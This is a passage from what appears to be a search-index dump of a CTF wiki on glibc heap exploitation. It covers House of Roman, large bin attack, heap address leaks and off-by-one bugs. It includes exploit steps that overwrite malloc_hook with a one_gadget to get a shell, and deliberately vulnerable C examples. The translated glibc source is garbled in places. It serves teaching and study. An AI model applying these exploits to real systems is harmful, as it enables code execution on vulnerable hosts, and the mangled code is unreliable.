0x71\n0x555555757030: 0x7ffff7dd1b58 &lt;main_arena+88&gt;  0x7ffff7dd1b58 &lt;main_arena+88&gt;\n0x555555757040: 0x4141414141414141      0x4141414141414141\n0x555555757050: 0x4141414141414141      0x4141414141414141\n0x555555757060: 0x4141414141414141      0x4141414141414141\n0x555555757070: 0x4141414141414141      0x4141414141414141\n0x555555757080: 0x4141414141414141      0x4141414141414141\n0x555555757090: 0x4141414141414141      0x61\n</code></pre> <p>We then need to fix this 0x71 FD freelist and fake it as a block that has already been released.</p> <pre><code>pwndbg&gt; x/40ag 0x555555757000\n0x555555757000: 0x0     0x21\n0x555555757010: 0x4141414141414141      0x4141414141414141\n0x555555757020: 0x4141414141414141      0x71       &lt;----------  free 0x71\n0x555555757030: 0x7ffff7dd1b58 &lt;main_arena+88&gt;  0x7ffff7dd1b58 &lt;main_arena+88&gt;\n0x555555757040: 0x4141414141414141      0x4141414141414141\n0x555555757050: 0x4141414141414141      0x4141414141414141\n0x555555757060: 0x4141414141414141      0x4141414141414141\n0x555555757070: 0x4141414141414141      0x4141414141414141\n0x555555757080: 0x4141414141414141      0x4141414141414141\n0x555555757090: 0x4141414141414141      0x61\n0x5555557570a0: 0x0     0x0\n0x5555557570b0: 0x0     0x0\n0x5555557570c0: 0x0     0x0\n0x5555557570d0: 0x0     0x0\n0x5555557570e0: 0x0     0x0\n0x5555557570f0: 0xd0    0x71   &lt;----------     free 0x71\n0x555555757100: 0x0     0x0\n0x555555757110: 0x0     0x0\n0x555555757120: 0x0     0x0\n0x555555757130: 0x0     0x0\n</code></pre> <pre><code>libc : 0x7ffff7a23d28 (\"malloc_hook\")\n</code></pre> <p>At this time our FD is already near the malloc hook and is not ready for blasting.</p>"},{"location":"pwn/linux/glibc-heap/house_of_roman/#step-2","title":"Step 2","text":"<p>We only need to release the fix by releasing a chunk of size 0x71.</p>"},{"location":"pwn/linux/glibc-heap/house_of_roman/#step-3","title":"Step 3","text":"<p>Take advantage of unsortebin's attacking techniques and use the editing function to write onegadet.</p>"},{"location":"pwn/linux/glibc-heap/house_of_roman/#exp-analysis","title":"Exp Analysis","text":"<p>Assign <code>3</code> <code>chunk</code>, set <code>p64(0x61)</code> at <code>B + 0x78</code>, the function is <code>fake size</code> for the following <code>fastbin attack</code></p> <pre><code>create(0x18,0) # 0x20\ncreate(0xc8,1) # d0\ncreate(0x65,2)  # 0x70\n\ninfo(\"create 2 chunk, 0x20, 0xd8\")\nfake = \"A\"*0x68\nfake += p64(0x61)  ## fake size\nedit(1,fake)\ninfo(\"fake\")\n</code></pre> <p>Release <code>B</code> and assign the same size again to <code>B</code>, where <code>B+0x10</code> and <code>B+0x18</code> have the address of <code>main_arean</code>. Assign <code>3</code> <code>fastbin</code> and <code>off by one</code> to modify <code>B-&gt;size = 0x71</code></p> <pre><code>free(1)\ncreate(0xc8,1)\n\ncreate(0x65,3)  # b\ncreate(0x65,15)\ncreate(0x65,18)\n\nover = \"A\"*0x18  # off by one\nover += \"\\x71\"  # set chunk  1's size --&gt; 0x71\nedit(0,over)\ninfo(\"use off by one ,  chunk  1's size --&gt; 0x71\")\n</code></pre> <p>Generate two <code>fastbin</code>s, then use <code>uaf</code> to write some addresses and chain <code>B</code> to <code>fastbin</code></p> <pre><code>free(2)\nfree(3)\ninfo(\"Create two 0x70 fastbin\")\nheap_po = \"\\x20\"\nedit (3, heap_po)\ninfo(\"Link chunk'1 into fastbin\")\n</code></pre> <p>Debug to see the status of <code>fastbin</code> at this time</p> <pre><code>pwndbg&gt; fastbins \nfastbins\n0x20: 0x0\n0x30: 0x0\n0x40: 0x0\n0x50: 0x0\n0x60: 0x0\n0x70: 0x555555757160 \u2014\u25b8 0x555555757020 \u2014\u25b8 0x7ffff7dd1b78 (main_arena+88) \u25c2\u2014 0x7ffff7dd1b78\n0x80: 0x0\n</code></pre> <p><code>0x555555757020</code> is <code>chunk B</code></p> <p>Then by modifying the low <code>2</code> bytes of <code>B-&gt;fd</code>, make <code>B-&gt;fd= malloc_hook - 0x23</code></p> <pre><code># malloc_hook above\nmalloc_hook_nearly = \"\\xed\\x1a\"\nedit(1,malloc_hook_nearly)\ninfo(\"Partial write, modify fastbin-&gt;fd ---&gt; malloc_hook\")\n</code></pre> <p>Then allocate <code>3</code> <code>`xk</code> of <code>0x70</code>, and you can get the <code>chunk</code> where <code>malloc_hook</code> is located.</p> <pre><code>create(0x65,0)\ncreate(0x65,0)\ncreate(0x65,0)\n</code></pre> <p>Then <code>free</code> drop <code>E</code>, enter <code>fastbin</code>, use <code>uaf</code> to set <code>E-&gt;fd = 0</code>, fix <code>fastbin</code></p> <pre><code>free(15)\nedit(15,p64(0x00))\ninfo(\"Generate 0x71 fastbin again, modify fd =0, fix fastbin\")\n</code></pre> <p>Then an unsorted bin attack, making the value of malloc_hook main_arena+88</p> <pre><code>create(0xc8,1)\ncreate(0xc8,1)\ncreate(0x18,2)\ncreate(0xc8,3)\ncreate(0xc8,4)\nfree(1)\npo = \"B\" * 8\npo + = \"\\x00\\x1b\"\nedit (1, po)\ncreate(0xc8,1)\ninfo(\"unsorted bin makes malloc_hook have the address of libc\")\n</code></pre> <p>Make the <code>malloc_hook</code> address of <code>one_gadget</code> by modifying the lower three bytes of <code>malloc_hook</code></p> <pre><code>over = \"R\"*0x13   # padding for malloc_hook\nover + = \"\\xa4\\xd2\\xaf\"\nedit(0,over)\n\ninfo(\"malloc_hook to one_gadget\")\n</code></pre> <p>Then <code>free</code> twice with the same <code>chunk</code>, trigger <code>malloc_printerr</code> , <code>getshell</code></p> <pre><code>free(18)\nfree(18)\n</code></pre>"},{"location":"pwn/linux/glibc-heap/house_of_roman/#link","title":"Link","text":"<p>https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc</p> <p>https://github.com/romanking98/House-Of-Roman</p> <p>https://xz.aliyun.com/t/2316</p>"},{"location":"pwn/linux/glibc-heap/introduction/","title":"\u5806\u5229\u7528","text":"<p>In this chapter, we will follow the steps below</p> <ol> <li>Introducing the macro operation of the heap we know well about dynamic memory allocation</li> <li>Describe the data structures used to achieve these operations</li> <li>Introduce the specific operations of using these data structures to achieve heap allocation and recycling</li> <li>Introduce the various utilization techniques of the heap from shallow to deep.</li> </ol> <p>For different applications, due to the different memory requirements, there are many implementations of the heap, as follows:</p> <pre><code>dlmalloc  \u2013 General purpose allocator\n\nptmalloc2 \u2013 glibc\n\njemalloc  \u2013 FreeBSD and Firefox\n\ntcmalloc  \u2013 Google\n\nlibumem - Solaris\n</code></pre> <p>Here we mainly introduce the implementation of the heap in glibc. If there is time later, it will continue to introduce the implementation of other heaps and their utilization.</p> <p>The main reference materials in this section are as follows. There are many contents in the text that will be consistent with the reference materials, and will not be explained in the future.</p> <ul> <li> <p>black hat heap exploitation</p> </li> <li> <p>github heap exploition</p> </li> <li> <p>sploitfun</p> </li> <li> <p>glibc source code</p> </li> <li>For more references, please see the files in the ref directory.</li> </ul>"},{"location":"pwn/linux/glibc-heap/large_bin_attack/","title":"Large Bin Attack","text":""},{"location":"pwn/linux/glibc-heap/large_bin_attack/#introduction","title":"Introduction","text":"<p>Large Bin Attack can be used to modify the value of any address. For example, to modify global_max_fast and then do the next fast bin attack.</p> <pre><code>while ((victim = unsorted_chunks (off) -&amp;gt; bk)! = unsorted_chunks (off))\n{\n\n    bck = victim-&gt;bk;\n\n    if (__builtin_expect (chunksize_nomask (victim) &lt;= 2 * SIZE_SZ, 0)\n\n        || __builtin_expect (chunksize_nomask (victim)\n\n&amp;gt; off-&amp;gt; system_mem, 0))\n            malloc_printerr (check_action, \"malloc(): memory corruption\",\n\nchunk2mem (victim), off);\n    size = chunksize (victim);\n\n\n\n    /*\n\n      If a small request, try to use last remainder if it is the\n\n      only chunk in unsorted bin.  This helps promote locality for\n\n      runs of consecutive small requests. This is the only\n\n      exception to best-fit, and applies only when there is\n\n      no exact fit for a small chunk.\n\n    */\n\n\n\n    if (in_smallbin_range (nb) &amp;&amp;\n\nbck == unsorted_chunks (off) &amp;amp;&amp;amp;\nvictim == off-&amp;gt; last_remainder &amp;amp;&amp;amp;\n        (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE))\n\n    {\n\n        /* split and reattach remainder */\n\n        remainder_size = size - nb;\n\n        remainder = chunk_at_offset (victim, nb);\n\nunsorted_chunks (off) -&amp;gt; bk = unsorted_chunks (off) -&amp;gt; fd = remainder;\nav-&amp;gt; last_remainder = remainder;\n        remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);\n\n        if (!in_smallbin_range (remainder_size))\n\n        {\n\n            remainder-&gt;fd_nextsize = NULL;\n\n            remainder-&gt;bk_nextsize = NULL;\n\n        }\n\n\n\n        set_head (victim, nb | PREV_INUSE |\n\n(av! = &amp;amp; main_arena? NON_MAIN_ARENA: 0));\n        set_head (remainder, remainder_size | PREV_INUSE);\n\n        set_foot (remainder, remainder_size);\n\n\n\ncheck_malloced_chunk (off, victim, nb);\n        void *p = chunk2mem (victim);\n\n        alloc_perturb (p, bytes);\n\n        return p;\n\n    }\n\n\n\n    /* remove from unsorted list */\n\nunsorted_chunks (off) -&amp;gt; bk = bck;\nbck-&amp;gt; fd = unsorted_chunks (off);\n\n\n    /* Take now instead of binning if exact fit */\n\n\n\n    if (size == nb)\n\n    {\n\n         set_inuse_bit_at_offset (victim, size);\n\nif (by! = &amp;amp; main_arena)\n             set_non_main_arena (victim);\n\ncheck_malloced_chunk (off, victim, nb);\n         void *p = chunk2mem (victim);\n\n         alloc_perturb (p, bytes);\n\n         return p;\n\n    }\n\n\n\n    /* place chunk in bin */\n\n    if (in_smallbin_range (size))\n\n    {\n\n        victim_index = smallbin_index (size);\n\nbck = bin_at (off, victim_index);\n        fwd = bck-&gt;fd;\n\n    }\n\n    else\n\n    {\n\n        victim_index = largebin_index (size);\n\nbck = bin_at (off, victim_index);\n        fwd = bck-&gt;fd;\n\n\n\n        /* maintain large bins in sorted order */\n\n        if (fwd != bck)\n\n        {\n\n             /* Or with inuse bit to speed comparisons */\n\n             size |= PREV_INUSE;\n\n             /* if smaller than smallest, bypass loop below */\n\n             assert (chunk_main_arena (bck-&gt;bk));\n\n             if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))\n\n             {\n\n                 fwd = bck;\n\n                 bck = bck-&gt;bk;\n\n                 victim-&gt;fd_nextsize = fwd-&gt;fd;\n\n                 victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;\n\n                 fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;\n\n              }\n\n              else\n\n              {\n\n                  assert (chunk_main_arena (fwd));\n\n                  while ((unsigned long) size &lt; chunksize_nomask (fwd))\n\n                  {\n\n                      fwd = fwd-&gt;fd_nextsize;\n\n                      assert (chunk_main_arena (fwd));\n\n                  }\n\n\n\n                  if ((unsigned long) size == (unsigned long) chunksize_nomask (fwd))\n\n                        /* Always insert in the second position.  */\n\n                        fwd = fwd-&gt;fd;\n\n                  else\n\n                  {\n\n                      victim-&gt;fd_nextsize = fwd;\n\n                      victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;\n\n                      fwd-&gt;bk_nextsize = victim;\n\n                      victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;\n\n                  }\n\n                  bck = fwd-&gt;bk;\n\n              }\n\n          }\n\n          else\n\n              victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;\n\n    }\n\n\n\n\n\n\nmark_bin (off, victim_index);\n    victim-&gt;bk = bck;\n\n    victim-&gt;fd = fwd;\n\n    fwd-&gt;bk = victim;\n\n    bck-&gt;fd = victim;\n\n\n\n#define MAX_ITERS 10000\nif (++ iters&amp;gt; = MAX_ITERS)\n        break;\n\n}\n</code></pre> <p>The code associated with largebin is as above, the main core code we are using is the following branch:</p> <p>When the <code>if ((unsigned long) size == (unsigned long) chunksize_nomask (fwd))</code> condition is not satisfied</p> <pre><code>                  if ((unsigned long) size == (unsigned long) chunksize_nomask (fwd))\n\n                        /* Always insert in the second position.  */\n\n                        fwd = fwd-&gt;fd;\n\n                  else\n\n                  {\n\n                      victim-&gt;fd_nextsize = fwd;\n\n                      victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;\n\n                      fwd-&gt;bk_nextsize = victim;\n\n                      victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;\n\n                  }\n</code></pre>"},{"location":"pwn/linux/glibc-heap/large_bin_attack/#example","title":"example","text":""},{"location":"pwn/linux/glibc-heap/large_bin_attack/#0x1-how2heaplarge_bin_attack","title":"0x1 how2heap\uff1alarge_bin_attack","text":"<p>We constructed the following scenario:</p> <pre><code>PwnLife&gt; parseheap\n\naddr                prev                size                 status              fd                bk\n\n0x603000            0x0                 0xa0                 Used                None              None\n\n0x6030a0            0x0                 0x290                Freed     0x7ffff7dd1b58          0x6037a0\n\n0x603330            0x290               0x30                 Used                None              None\n\n0x603360            0x0                 0x410                Freed     0x7ffff7dd1f48    0x7ffff7dd1f48\n\n0x603770            0x410               0x30                 Used                None              None\n\n0x6037a0            0x0                 0x410                Freed           0x6030a0    0x7ffff7dd1b58\n\n0x603bb0            0x410               0x30                 Used                None              None\n</code></pre> <p>The chunk scenario is as follows:</p> <pre><code>                  top: 0x603be0 (size : 0x20420)\n\n       last_remainder: 0x6030a0 (size : 0x290)\n\n            unsortbin: 0x6037a0 (size : 0x410) &lt;--&gt; 0x6030a0 (size : 0x290)\n\n         largebin[ 0]: 0x603360 (size : 0x410)\n</code></pre> <p>unsortbin :</p> <pre><code>+----------------------------------------+\n\n|                                        |\n\n|                                        |\n\n|               +-------------+          |\n\n| | | v\n| P3 v | P1\n|         +-----+------+      |     +------------+\n\n|         |            |      |     |            |\n\n|         |            |      |     |            |\n\n|         +------------+      |     +------------+\n\n|         |            |      |     |            |\n\n|         | size:0x410 |      |     | size:0x290 |\n\n|         +------------+      |     +------------+\n\n|         |            |      |     |            |\n\n+ ----------- + fd | | | |\n          +------------+      |     +------------+\n\n          |            |      |     |            |\n\n          |            |      +---------+ bk     |\n\n          +------------+            +------------+\n</code></pre> <p>Then we modify the chunk of P2 through some kind of vulnerability:</p> <pre><code>    p2[-1] = 0x3f1;\n\n    p2[0] = 0;\n\n    p2[2] = 0;\n\n    p2[1] = (unsigned long)(&amp;stack_var1 - 2);\n\n    p2[3] = (unsigned long)(&amp;stack_var2 - 4);\n</code></pre> <p>Then we malloc a new chunk. At this time, because the fastbin is empty, the program traverses the unsorted bin. At that time, when the chunk in the unsorted bin is a large chunk, first determine whether the current chunk size is smaller than <code>bck-&gt;bk</code>. The size, which is the smallest chunk in the large bin, if it is, is added directly to the end. If not, it traverses the large bin until it finds that the size of a chunk is less than or equal to the current chunk size (the chunks of the large bin are aligned from large to small). Then insert the current chunk into the two linked lists of the large bin.</p> <p>The <code>fd_nextsize</code> in the large bin chunk points to the first chunk in the list that is smaller than itself, and <code>bk_nextsize</code> points to the first chunk larger than itself.</p> <p>At this time, we have only one chunk in the largebin, and the current chunk size is 0x290 is smaller than the chunk size in the largebin. First, the chunk in the unsorted bin is placed in the large bin, and then the large bin is traversed. At this time, the fwd chunk does not match the if. ((unsigned long) size == (unsigned long) chunksize_nomask (fwd))` When this condition:</p> <pre><code>    [...]\n\n\n\n              else\n\n              {\n\n                  victim-&gt;fd_nextsize = fwd;\n\n                  victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;\n\n                  fwd-&gt;bk_nextsize = victim;\n\n                  victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;\n\n              }\n\n              bck = fwd-&gt;bk;\n\n\n\n    [...]\n\n\n\nmark_bin (off, victim_index);\n    victim-&gt;bk = bck;\n\n    victim-&gt;fd = fwd;\n\n    fwd-&gt;bk = victim;\n\n    bck-&gt;fd = victim;\n</code></pre> <p>Fwd is now P2, victim is P3, and the two variables on the stack can be modified to <code>victim</code>.</p> <p>In detail: <pre><code>victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;\n// then\nvictim-&gt;bk_nextsize-&gt;fd_nextsize = victim;\n</code></pre></p> <p>Here <code>fwd-&gt;bk_nextsize</code> stores <code>&amp;stack_var2 - 4</code>, so the above statements equals to: <pre><code>(&amp;stack_var2 - 4)-&gt;fd_nextsize = victim;\n// equals to\n*(&amp;stack_var2 - 4 + 4) = victim;\n</code></pre> , modifying <code>stack_var2</code>.</p> <p>And then, we set <code>bck = fwd-&gt;bk</code>, and the following code will be executed: <pre><code>mark_bin (off, victim_index);\nvictim-&gt;bk = bck;\nvictim-&gt;fd = fwd;\nfwd-&gt;bk = victim;\nbck-&gt;fd = victim;\n</code></pre></p> <p>Here we have: <pre><code>fwd-&gt;bk = victim;\n// equals to\n*(&amp;stack_var1 - 2 + 2) = victim\n</code></pre></p> <p>Thus modifying <code>stack_var1</code>.</p>"},{"location":"pwn/linux/glibc-heap/leak_heap/","title":"Information leakage through the heap","text":""},{"location":"pwn/linux/glibc-heap/leak_heap/#what-is-information-leakage","title":"What is information leakage?","text":"<p>In the CTF, the Pwn topic is generally run on a remote server. Therefore, we can not know the address information such as libc.so address and Heap base address on the server, but these addresses are often needed when utilizing, and information leakage is required.</p>"},{"location":"pwn/linux/glibc-heap/leak_heap/#information-leakage-target","title":"Information leakage target","text":"<p>What are the targets of information leakage? We can know this by observing the memory space.</p> <pre><code>Start              End                Offset             Perm Path\n\n0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/pwn\n\n0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/pwn\n\n0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/pwn\n\n0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]\n\n0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so\n\n0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so\n\n0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so\n\n0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so\n\n0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- \n\n0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so\n\n0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw- \n\n0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw- \n\n0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]\n\n0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]\n\n0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so\n\n0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so\n\n0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- \n\n0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]\n\n0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]\n</code></pre> <p>First, the first one is the base address of the main module, because the base address of the main module will change only when the PIE (address-independent code) is turned on. Therefore, the address of the main module does not need to be leaked normally. The second is the heap address. The heap address is changed for each process. For example, when you need to control the data in the heap, you may need to leak the base address first. The third is the address of libc.so. In many cases, we can only implement code execution through functions such as system in libc, and structures such as malloc_hook, one_gadgets, and IO_FILE are also stored in libc, so the address of libc is also leaked. The goal.</p>"},{"location":"pwn/linux/glibc-heap/leak_heap/#by-what-to-leak","title":"By what to leak","text":"<p>Through the previous knowledge, we know that the heap is divided into unsorted bin, fastbin, smallbin, large bin, etc. We examine these structures one by one to see how to leak.</p>"},{"location":"pwn/linux/glibc-heap/leak_heap/#unsorted-bin","title":"unsorted bin","text":"<p>We construct two unsorted bins and look at its memory. Now there are two blocks in the unsorted bin list. The address of the first block is 0x602000 and the address of the second block is 0x6020f0.</p> <pre><code>0x602000:   0x0000000000000000  0x00000000000000d1\n\n0x602010: 0x00007ffff7dd1b78 0x00000000006020f0 &amp;lt;=== points to the next block\n0x602020:   0x0000000000000000  0x0000000000000000\n\n0x602030:   0x0000000000000000  0x0000000000000000\n</code></pre> <pre><code>0x6020f0:   0x0000000000000000  0x00000000000000d1\n\n0x602100: 0x0000000000602000 0x00007ffff7dd1b78 &amp;lt;=== pointing to main_arena\n0x602110:   0x0000000000000000  0x0000000000000000\n\n0x602120:   0x0000000000000000  0x0000000000000000\n</code></pre> <p>So we know that through the unsorted bin we can get the address of a certain heap block and the address of main_areana. Once the address of a heap block is obtained, it can be calculated by the size of malloc to obtain the heap base address. Once the address of main_arena is obtained, since main_arena exists in libc.so, the offset can be calculated to get the base address of libc.so. Therefore, through the unsorted bin, you can get: 1. The base address of 1.libc.so 2. Heap base address</p>"},{"location":"pwn/linux/glibc-heap/leak_heap/#fastbin","title":"fastbin","text":"<p>We constructed two fastbins and looked at their memory. Now there are two blocks in the fastbin list. The address of the first block is 0x602040 and the address of the second block is 0x602000.</p> <pre><code>0x602000:   0x0000000000000000  0x0000000000000021\n\n0x602010:   0x0000000000000000  0x0000000000000000\n</code></pre> <pre><code>0x602040:   0x0000000000000000  0x0000000000000021\n\n0x602050: 0x0000000000602000 0x0000000000000000 &amp;lt;=== points to the first block\n</code></pre> <p>According to the previous knowledge, we know that the block fd field at the end of the fastbin list is 0, after which the fd field of each block points to the previous block. Therefore, only the base address of the heap can be leaked by fastbin.</p>"},{"location":"pwn/linux/glibc-heap/leak_heap/#smallbin","title":"smallbin","text":"<p>We constructed two fastbins and looked at their memory. Now there are two blocks in the fastbin list. The address of the first block is 0x602000 and the address of the second block is 0x6020f0. <pre><code>0x602000:   0x0000000000000000  0x00000000000000d1\n\n0x602010: 0x00007ffff7dd1c38 0x00000000006020f0 &amp;lt;=== Address of the next block\n0x602020:   0x0000000000000000  0x0000000000000000\n\n0x602030:   0x0000000000000000  0x0000000000000000\n</code></pre></p> <pre><code>0x6020f0:   0x0000000000000000  0x00000000000000d1\n\n0x602100: 0x0000000000602000 0x00007ffff7dd1c38 &amp;lt;=== address of main_arena\n0x602110:   0x0000000000000000  0x0000000000000000\n\n0x602120:   0x0000000000000000  0x0000000000000000\n</code></pre> <p>Therefore, through the smallbin can get: 1.libc.so base address 2.heap base address</p>"},{"location":"pwn/linux/glibc-heap/leak_heap/#which-vulnerabilities-can-be-used-for-leaks","title":"Which vulnerabilities can be used for leaks","text":"<p>Through the previous knowledge, we can know what address information exists in the heap, but to obtain these addresses, we need to implement the vulnerability. Generally speaking, the following vulnerabilities are available for information vulnerabilities.</p> <ul> <li>heap memory is not initialized</li> <li>Heap overflow</li> <li> <p>Use-After-Free</p> </li> <li> <p>Cross-border reading</p> </li> <li>heap extend </li> </ul>"},{"location":"pwn/linux/glibc-heap/leak_heap/#0x01-read-uaf","title":"## 0x01 read UAF","text":"<p>By, UAF, leaking heapbase:</p> <pre><code>p0 = malloc(0x20);\n\np1 = malloc(0x20);\n\n\n\nfree(p0);\n\nfree(p1);\n\n\n\nprintf('heap base:%p',*p1);\n</code></pre> <p>Due to the nature of the fastbin list, when we construct a fastbin list</p> <pre><code>(0x30)     fastbin[1]: 0x602030 --&gt; 0x602000 --&gt; 0x0\n</code></pre> <p>There is a phenomenon of chunk 1 -&gt; chunk 0. If the UAF vulnerability exists at this time, we can print the address of chunk 0 through show chunk 1.</p> <p>Similarly, leaking libc base</p> <pre><code>p0 = malloc(0x100);\n\nfree(p0);\n\nprintf(\"libc: %p\\n\", *p0);\n</code></pre>"},{"location":"pwn/linux/glibc-heap/leak_heap/#0x02-overlapping-chunks","title":"0x02  overlapping chunks","text":""},{"location":"pwn/linux/glibc-heap/leak_heap/#0x03-partial-overwrite","title":"0x03 Partial Overwrite","text":""},{"location":"pwn/linux/glibc-heap/leak_heap/#0x04-relative-write","title":"0x04 Relative Write","text":""},{"location":"pwn/linux/glibc-heap/off_by_one/","title":"Off-By-One in the heap","text":""},{"location":"pwn/linux/glibc-heap/off_by_one/#introduction","title":"Introduction","text":"<p>Strictly speaking, the off-by-one vulnerability is a special type of overflow vulnerability. Off-by-one means that when a program writes to a buffer, the number of bytes written exceeds the number of bytes requested by the buffer itself. And only one byte is crossed.</p>"},{"location":"pwn/linux/glibc-heap/off_by_one/#off-by-one-vulnerability-principle","title":"off-by-one Vulnerability Principle","text":"<p>Off-by-one refers to a single-byte buffer overflow. This vulnerability is often related to the lack of strict boundary verification and string operations. Of course, it does not rule out that the size of the write is just one byte more. Where the boundary verification is not strict, usually includes</p> <ul> <li>When writing data to a heap block using a loop statement, the number of loops set incorrectly (which is common in C language beginners) results in more than one byte being written.</li> <li>String operation is not appropriate</li> </ul> <p>In general, single-byte overflows are considered to be difficult to exploit, but because of the looseness of Linux's heap management mechanism ptmalloc validation, Linux-based off-by-one exploits are not complex and powerful. In addition, the point to note is that off-by-one can be based on various buffers, such as stacks, bss segments, etc., but the heap-based off-by-one is more common in CTFs. We will only discuss the off-by-one situation on the heap here.</p>"},{"location":"pwn/linux/glibc-heap/off_by_one/#off-by-one-use-ideas","title":"off-by-one Use ideas","text":"<ol> <li>The overflow byte is any byte that can be controlled: by modifying the size, there is overlap between the block structures, thereby leaking other block data or overwriting other block data. You can also use the NULL byte overflow method.</li> <li>The overflow byte is NULL. When the size is 0x100, overflowing the NULL byte makes the <code>prev_in_use</code> bit clear, so the previous block is considered a free block. (1) At this point you can choose to use the unlink method (see the unlink section) for processing. (2) In addition, when the <code>prev_size</code> field is enabled, you can forge <code>prev_size</code>, causing overlap between blocks. The key to this method is that unlink does not check whether the last block of the block found by <code>prev_size</code> (theoretically the block currently unlinked) is equal to the block size currently being unlinked.</li> </ol> <p>In the latest version of the code, the check for the latter method in 2 has been added, but the check was not available before 2.28.</p> <pre><code>/* consolidate backward */\n\n    if (!prev_inuse(p)) {\n\n      prevsize = prev_size (p);\n\n      size += prevsize;\n\n      p = chunk_at_offset(p, -((long) prevsize));\n\n/* The last two lines of code are added in the latest version, then the second method of 2 is not available, but there is no problem in 2.28 and before*/\n      if (__glibc_unlikely (chunksize(p) != prevsize))\n\n        malloc_printerr (\"corrupted size vs. prev_size while consolidating\");\n\nunlink_chunk (av, p);\n    }\n</code></pre>"},{"location":"pwn/linux/glibc-heap/off_by_one/#example-1","title":"Example 1","text":"<pre><code>int my_gets(char *ptr,int size)\n\n{\n\n    int i;\n\n    for(i=0;i&lt;=size;i++)\n\n    {\n\n        ptr[i]=getchar();\n\n    }\n\n    return i;\n\n}\n\nint main()\n\n{\n\n    void *chunk1,*chunk2;\n\n    chunk1=malloc(16);\n\n    chunk2=malloc(16);\n\n    puts(\"Get Input:\");\n\n    my_gets(chunk1,16);\n\n    return 0;\n\n}\n</code></pre> <p>Our own my_gets function caused an off-by-one vulnerability because the boundaries of the for loop were not controlled enough to cause writes to be executed once, which is also called a fence error.</p> <p>wikipedia:</p> <p>&gt; Fence errors (sometimes called pole errors or lamppost errors) are a type of error. Such as the following questions:</p> <p>&gt; Build a straight fence (ie no circle), 30 meters long, 3 meters apart between each fence column, how many fence posts do you need?</p> <p>&gt; The easiest answer 10 is wrong. This fence has 10 intervals and 11 fence posts.</p> <p>We use gdb to debug the program. Before inputting, we can see that the two allocated user areas are 16-byte heap blocks. <pre><code>0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1\n\n0x602010:   0x0000000000000000  0x0000000000000000\n\n0x602020:   0x0000000000000000  0x0000000000000021 &lt;=== chunk2\n\n0x602030:   0x0000000000000000  0x0000000000000000\n</code></pre></p> <p>When we execute my_gets for input, we can see that the data has overflowed to cover the prev_size field of the next heap. print 'A'*17</p> <pre><code>0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1\n\n0x602010:   0x4141414141414141  0x4141414141414141\n\n0x602020:   0x0000000000000041  0x0000000000000021 &lt;=== chunk2\n\n0x602030:   0x0000000000000000  0x0000000000000000\n</code></pre>"},{"location":"pwn/linux/glibc-heap/off_by_one/#example-2","title":"Example 2","text":"<p>The second common scenario that causes off-by-one is string manipulation. The common reason is that the end of the string is incorrectly calculated.</p> <pre><code>int main(void)\n\n{\n\n    char buffer[40]=\"\";\n\n    void *chunk1;\n\n    chunk1=malloc(24);\n\n    puts(\"Get Input\");\n\n    gets(buffer);\n\n    if(strlen(buffer)==24)\n\n    {\n\n        strcpy(chunk1,buffer);\n\n    }\n\n    return 0;\n\n\n\n}\n</code></pre> <p>At first glance, the program doesn't seem to have any problems (regardless of stack overflow), and many people may write it in the actual code as well. However, the behavior of strlen and strcpy is inconsistent, which leads to the occurrence of off-by-one. Strlen is a function we are familiar with calculating the length of an ascii string. This function does not count the terminator <code>&amp;#39;\\x00&amp;#39;</code> when calculating the length of a string, but strcpy copies the terminator when copying a string. '\\x00'`. This caused us to write 25 bytes to chunk1, which we can see with gdb debugging.</p> <pre><code>0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1\n\n0x602010:   0x0000000000000000  0x0000000000000000\n\n0x602020:   0x0000000000000000  0x0000000000000411 &lt;=== next chunk\n</code></pre> <p>Execute strcpy after we type 'A'*24</p> <pre><code>0x602000:   0x0000000000000000  0x0000000000000021\n\n0x602010:   0x4141414141414141  0x4141414141414141\n\n0x602020:   0x4141414141414141  0x0000000000000400\n</code></pre> <p>You can see that the low byte of the size field of the next chunk is overwritten by the terminator <code>&amp;#39;\\x00&amp;#39;</code>. This branch of the off-by-one is called NULL byte 